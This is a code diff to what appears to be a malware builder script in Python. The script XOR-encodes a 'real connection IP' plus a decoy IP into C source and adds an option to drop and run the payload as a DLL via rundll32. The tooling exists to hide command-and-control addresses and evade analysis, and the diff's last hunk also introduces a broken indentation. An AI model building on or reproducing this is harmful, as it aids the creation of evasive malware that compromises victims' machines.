@@ -26,7 +26,7 @@ def xor_encode_ip(ip_str, key):
     return "{" + ", ".join(hex(b) for b in encoded) + "}"
 
 
-def patch_source(source, xor_key, primary_ip, real_ip, real_ip_key, decoy_ip, decoy_ip_key):
+def patch_source(source, xor_key, primary_ip, real_ip, real_ip_key, decoy_ip, decoy_ip_key, inject=True):
     source = re.sub(r"#define XOR_KEY 0x[0-9a-fA-F]+",
                     f"#define XOR_KEY {hex(xor_key)}", source)
     source = re.sub(r'#define PRIMARY_IP "[^"]*"',
@@ -45,6 +45,10 @@ def patch_source(source, xor_key, primary_ip, real_ip, real_ip_key, decoy_ip, de
                     f"#define ENCODED_IP2 {encoded_decoy}", source)
     source = re.sub(r"#define ENCODED_IP2_LEN \d+",
                     f"#define ENCODED_IP2_LEN {len(decoy_ip)}", source)
+    if inject:
+        source = re.sub(r'^//#define INJECT', '#define INJECT', source, flags=re.MULTILINE)
+    else:
+        source = re.sub(r'^#define INJECT$', '//#define INJECT', source, flags=re.MULTILINE)
     return source
 
 
@@ -56,6 +60,10 @@ def main():
                         help="Real connection IP, obfuscated")
     parser.add_argument("--ip3", required=True,
                         help="Secondary obfuscated IP, no connection")
+    parser.add_argument("--inject", action="store_true", default=True,
+                        help="Drop and run as DLL via rundll32 (default)")
+    parser.add_argument("--no-inject", dest="inject", action="store_false",
+                        help="Drop and run as EXE directly")
     args = parser.parse_args()
 
     os.makedirs(OUTPUT_DIR, exist_ok=True)
@@ -84,6 +92,7 @@ def main():
             real_ip_key=ip_xor_key,
             decoy_ip=args.ip3,
             decoy_ip_key=ip2_xor_key,
+            inject=args.inject,
         )
         with open(SOURCE, "w") as f:
             f.write(source)
@@ -113,7 +122,7 @@ def main():
 
     with open(SOURCE, "r") as f:
         source = f.read()
-    source = patch_source(
+        source = patch_source(
         source,
         xor_key=0x73,
         primary_ip=DEFAULT_PRIMARY_IP,
@@ -121,6 +130,7 @@ def main():
         real_ip_key=DEFAULT_IP_XOR_KEY,
         decoy_ip=DEFAULT_DECOY_IP,
         decoy_ip_key=DEFAULT_IP2_XOR_KEY,
+        inject=True,
     )
     with open(SOURCE, "w") as f:
         f.write(source)
